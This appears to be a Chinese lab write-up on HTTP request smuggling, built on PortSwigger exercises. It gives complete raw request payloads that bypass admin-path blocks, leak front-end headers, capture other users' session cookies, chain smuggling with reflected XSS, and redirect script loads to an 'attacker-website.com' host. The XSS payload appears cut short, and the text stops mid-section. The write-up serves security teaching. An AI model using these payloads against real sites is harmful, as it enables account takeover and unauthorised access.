上面我们大概介绍了几种攻击方式，下面我来看看这些攻击方式可以用来干嘛。同样我们将配合实验环境帮助理解与复现。
### Bypass Front-end Security Controls
这里提供了两个实验环境，一个是 CL-TE 形式的 [Lab: Exploiting HTTP request smuggling to bypass
front-end security controls, CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
，一个是TE-CL 形式的 [Lab: Exploiting HTTP request smuggling to bypass front-end
security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)，两个实验最终达到的目的一样，这里我们随便选用 CL-TE 的来进行实验。
> ​ This lab involves a front-end and back-end server, and the front-end
> server doesn't support chunked encoding. There's an admin panel at /admin,
> but the front-end server blocks access to it.
>
> To solve the lab, smuggle a request to the back-end server that accesses the
> admin panel and deletes the user carlos.
架构一样，只不过这次我们需要去利用 HTTP Smuggling 获取 admin 权限并删除 carlos 用户。
我们生成 LAB 之后，直接访问`/admin`会发现 `"Path /admin is
blocked"`，看来不能通过正常方式访问`/admin`，那我们尝试 HTTP Smuggling 的方式，发送如下数据包两次：
    POST / HTTP/1.1
    Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a
    Content-Length: 28
    Transfer-Encoding: chunked
    0
    GET /admin HTTP/1.1
得到的响应如下两图
可以看到第二个请求我们得到了`/admin`的响应
      Admin interface only available if logged in as an administrator, or if requested as localhost
于是我们添加 HOST 头再次发送几次
    POST / HTTP/1.1
    Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a
    Content-Length: 45
    Transfer-Encoding: chunked
    0
    GET /admin HTTP/1.1
    Host: localhost
我们可以看到成功访问到了`/admin`面板内容，如果不成功可以多发送几次试试看
得到了删除的 api ，于是我们再利用 HTTP Smuggling 访问这个 `/admin/delete?username=carlos`
即可，构造如下数据包：
    POST / HTTP/1.1
    Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a
    Content-Length: 63
    Transfer-Encoding: chunked
    0
    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost
这种攻击方式类似 HTTP SSRF ，主要的点就是在控制 CL 数值上，比如说第一个数据包 CL 的值为 28 ，是这么计算的：
    0\r\n                                                       --> 3个字节
    \r\n                                                        --> 2个字节
    GET /admin HTTP/1.1\r\n                 --> 19+2 = 21 个字节
    \r\n                                                        --> 2个字节
所以这么结算下来就是 3+2+21+2 = 28字节。
TE-CL 的情况类似，这里就不再重复举例了。
### Revealing Front-end Request Rewriting
> ​
> 在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：
>
>   * 描述TLS连接所使用的协议和密码
>   * 包含用户IP地址的XFF头
>   * 用户的会话令牌ID
>
>
>
> 总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：
>
>   * 找一个能够将请求参数的值输出到响应中的POST请求
>   * 把该POST请求中，找到的这个特殊的参数放在消息的最后面
>   * 然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。
>
有时候 Front 服务器会给转发的请求添加一些请求头再转发给 Backend 服务器，我们可以利用 HTTP Smuggling
的方式来泄露这些请求头。同样我们借助 LAB 来实践理解：[Lab: Exploiting HTTP request smuggling to reveal
front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)
> This lab involves a front-end and back-end server, and the front-end server
> doesn't support chunked encoding.
>
> There's an admin panel at /admin, but it's only accessible to people with
> the IP address 127.0.0.1. The front-end server adds an HTTP header to
> incoming requests containing their IP address. It's similar to the
> X-Forwarded-For header but has a different name.
>
> To solve the lab, smuggle a request to the back-end server that reveals the
> header that is added by the front-end server. Then smuggle a request to the
> back-end server that includes the added header, accesses the admin panel,
> and deletes the user carlos.
这里根据题目提示，场景是一个 CL-TE 的场景，并且给出一个搜索框，我们尝试随便搜索一个 123 ，可以发现搜索结果“123”直接回显到了相应当中。
尝试使用 HTTP Smuggling 方式访问，但是被 blocked ：
然后我们可以尝试利用搜索回显把 Front 服务器转发的请求头给泄露出来：
如果后面只是添加那个 X-*-Ip 的请求头是访问不了 admin 面板的，因为这样会让 Backend
收到两个重复的请求头，在这个场景当中，Backend 服务器对重复的请求头做出了判断：
所以我们需要把 Front 服务器添加的请求头给“隐藏”掉，我们就可以利用 Smuggling 通过 body 的方式把其他 Front
服务器添加的请求头“隐藏”掉，然后我们就可以得到 admin 面板回显：
整个流程看起来比较简单，但是仔细做的话，其实 CL 的值比较关键，我们来看看泄露 Front 请求的那个数据包的 CL 值怎么算的：
    0\r\n                                                                                                       --> 3个字节
    \r\n                                                                                                        --> 2个字节
    POST / HTTP/1.1\r\n                                                                         --> 17个字节
    Content-Length: 70\r\n                                                                  --> 20个字节
    Content-Type: application/x-www-form-urlencoded\r\n         --> 49个字节
    \r\n                                                                                                        --> 2个字节
    search=123                                                                                          --> 10个字节
总共是 103 个字节，这里的 CL 也可以不是 70 ，这里只是控制泄露多少字节的内容。
还有一个比较需要注意的就是如果你不添加 Content-Type 字段的话，需要在最后添加一个`\r\n`，否则会返回 400 。
### Capturing other users' requests
既然能拿到中间件请求，当然我们也可以尝试去拿其他用户的请求，也能拿到 Cookie 等，LAB 地址：[Lab: Exploiting HTTP
request smuggling to capture other users'
requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)
> This lab involves a front-end and back-end server, and the front-end server
> doesn't support chunked encoding.
>
> To solve the lab, smuggle a request to the back-end server that causes the
> next user's request to be stored in the application. Then retrieve the next
> user's request and use the victim user's cookies to access their account.
原理也比较简单，我们可以找到一个发评论的地方，然后利用评论处进行 HTTP Smuggling，例如，我们可以构造以下请求包：
    POST / HTTP/1.1
    Host: ac951f7d1e9ea625803c617f003f005c.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 271
    Transfer-Encoding: chunked
    0
    POST /post/comment HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 600
    Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At
    csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&postId=5&name=1&email=1%40qq.com&website=http%3A%2F%2Fwww.baidu.com&comment=1
只要下面这个 CL 足够大，我们就可以用 HTTP Smuggling 把下一个用户的请求拼接到我们最后一个 comment
参数里面了，然后我们在看评论处就可以看到别人的请求头了。
### Exploit Reflected XSS
这个利用场景可能比较受限，也比较少见，但是如果存在 HTTP Smuggling & reflected XSS ，我们就可以利用这个组合拳 X 到别人的
cookie
> This lab involves a front-end and back-end server, and the front-end server
> doesn't support chunked encoding.
>
> The application is also vulnerable to [reflected
> XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
> via the User-Agent header.
>
> To solve the lab, smuggle a request to the back-end server that causes the
> next user's request to receive a response containing an XSS exploit that
> executes alert(1).
还是依旧的 CL-TE 场景，我们可以在 UA 处发现有一个反射 XSS，but 单是这样没什么用，所以我们得想点办法升级危害。
我们可以构造以下数据包，只要发送一次
    POST / HTTP/1.1
    Host: ac811f011e27d43b80301693005a0007.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ
    Upgrade-Insecure-Requests: 1
    Content-Length: 150
    Transfer-Encoding: chunked
    0
    GET /post?postId=5 HTTP/1.1
    User-Agent: ">
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 5
    x=1
然后我们随便访问该站任何页面都会被弹窗了，因为我们的请求被嵌入到了上面的第二个请求当中：
### Turn An On-Site Redirect Into An Open Redirect
这种攻击场景是在目标在使用 30x 跳转的时候，使用了 Host 头进行跳转，例如在 Apache & IIS 服务器上，一个uri 最后不带 /
的请求会被 30x 导向带 / 的地址，例如发送以下请求：
    GET /home HTTP/1.1
    Host: normal-website.com
我们会得到 Response :
    HTTP/1.1 301 Moved Permanently
    Location: https://normal-website.com/home/
看起来没什么危害，但是如果我们配合 HTTP Smuggling 就会有问题了，例如：
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 54
    Transfer-Encoding: chunked
    0
    GET /home HTTP/1.1
    Host: attacker-website.com
    Foo: X
Smugle 之后的请求会像以下这样：
    GET /home HTTP/1.1
    Host: attacker-website.com
    Foo: XGET /scripts/include.js HTTP/1.1
    Host: vulnerable-website.com